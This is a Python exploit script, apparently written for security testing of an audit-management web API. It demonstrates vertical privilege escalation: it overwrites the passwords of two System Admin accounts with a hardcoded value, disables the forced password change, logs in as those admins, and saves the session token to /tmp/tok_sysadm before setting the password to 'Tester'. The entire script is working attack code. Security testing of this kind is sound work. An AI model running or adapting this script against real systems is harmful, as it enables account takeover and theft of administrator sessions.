import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
PW="Zx9!sysadm47"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()

# role 2 = System Admin (above Owner in the hierarchy)
for uid in [17, 18]:
    c,b=req('GET',f'/api/v1/users/{uid}')
    u=json.loads(b)['users'][0]
    print(f"=== target {uid}: {u['email']} role={u['role_id']} (System Admin) ===")
    c2,b2=req('PUT',f'/api/v1/users/{uid}',{"user":{"job_title":"zx-probe"}})
    print(f"   job_title write -> {c2} {b2[:120].replace(chr(10),' ')}")
    c3,b3=req('PUT',f'/api/v1/users/{uid}',{"user":{"password":PW}})
    print(f"   password write  -> {c3} {b3[:120].replace(chr(10),' ')}")
    if c3=='200':
        req('PUT',f'/api/v1/users/{uid}',{"user":{"requires_password_change":False}})
        c4,b4=login(u['email'],PW)
        print(f"   LOGIN AS SYSTEM ADMIN -> {c4}")
        if c4=='200':
            s=json.loads(b4)['session']
            print(f"   !! VERTICAL ESCALATION: {s['email']} role={s['role_id']}")
            open('/tmp/tok_sysadm','w').write(s['token'])
            print("   restoring...")
            req('PUT',f'/api/v1/users/{uid}',{"user":{"password":"Tester"}})
            req('PUT',f'/api/v1/users/{uid}',{"user":{"requires_password_change":False}})
            req('PUT',f'/api/v1/users/{uid}',{"user":{"job_title":u.get('job_title') or ''}})
            break
    print()
